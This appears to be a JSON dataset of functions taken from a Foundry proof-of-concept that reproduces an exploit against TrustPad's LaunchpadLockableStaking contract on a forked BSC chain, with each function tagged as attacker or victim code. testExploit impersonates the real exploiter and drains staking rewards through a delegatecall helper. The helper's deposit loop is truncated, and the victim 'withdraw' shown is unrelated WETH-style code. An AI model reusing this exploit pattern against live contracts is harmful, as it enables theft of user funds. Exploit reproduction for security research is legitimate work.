[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "depositLockStart",
    "original_code": "    function depositLockStart(\n        address addr\n    ) external returns (uint256) {\n        (bool success,) =\n            address(helperContract).delegatecall(abi.encodeWithSignature(\"depositLockStart(address)\", addr));\n        require(success, \"Delegatecall to depositLockStart failed\");\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "isLocked",
    "original_code": "    function isLocked(\n        address account\n    ) external pure returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 33_260_104);\n        vm.label(address(LaunchpadLockableStaking), \"LaunchpadLockableStaking\");\n        vm.label(address(TPAD), \"TPAD\");\n        vm.label(address(DDD), \"DDD\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(Router), \"Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0.02 ether);\n        // Getting TPAD amount\n        WBNBToTPAD();\n        // Jump to time when attack was happened\n        vm.roll(33_260_391);\n        uint256 startBalanceTPAD = TPAD.balanceOf(address(this));\n\n        // Approve all DDD tokens from original exploiter to this attack contract\n        vm.prank(TrustPadProtocolExploiter);\n        DDD.approve(address(this), type(uint256).max);\n\n        helperContract = new HelperContract();\n        emit log_named_decimal_uint(\n            \"Exploiter's helper contract TPAD balance before attack\",\n            TPAD.balanceOf(address(helperContract)),\n            TPAD.decimals()\n        );\n\n        (bool success,) = address(helperContract).delegatecall(\n            abi.encodeWithSignature(\"deposit(address,uint256,uint256)\", address(LaunchpadLockableStaking), 30, 1)\n        );\n        require(success, \"Delegatecall to deposit not successfully\");\n\n        assertEq(TPAD.balanceOf(address(this)), startBalanceTPAD - 1);\n\n        // Jump to time when rewards were withdrew\n        vm.roll(33_260_396);\n\n        success = false;\n        (success,) = address(helperContract).delegatecall(\n            abi.encodeWithSignature(\"withdraw(address,uint256)\", address(LaunchpadLockableStaking), 0)\n        );\n        require(success, \"Delegatecall to withdraw not successfully\");\n\n        emit log_named_decimal_uint(\n            \"Exploiter's helper contract TPAD balance after attack\",\n            TPAD.balanceOf(address(helperContract)),\n            TPAD.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILaunchpadLockableStaking",
    "source_type": "victim_contract",
    "function_name": "lockPeriod",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILaunchpadLockableStaking",
    "source_type": "victim_contract",
    "function_name": "receiveUpPool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILaunchpadLockableStaking",
    "source_type": "victim_contract",
    "function_name": "stakePendingRewards",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILaunchpadLockableStaking",
    "source_type": "victim_contract",
    "function_name": "userInfo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILaunchpadLockableStaking",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperContract",
    "source_type": "attacker_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(address _for, uint256 _pid, uint256 _amount) external {\n        LaunchpadLockableStaking = ILaunchpadLockableStaking(_for);\n        DDD.transferFrom(TrustPadProtocolExploiter, address(this), 1);\n        require(_depositLockStart == uint256(0), \"Deposit lock should be false at begining\");\n        TPAD.approve(address(LaunchpadLockableStaking), type(uint256).max);\n        uint256 withdrawAmount = TPAD.balanceOf(address(this));\n\n        // Exploit start\n        uint8 i;\n        while (i < _pid) {\n",
    "description": ""
  }
]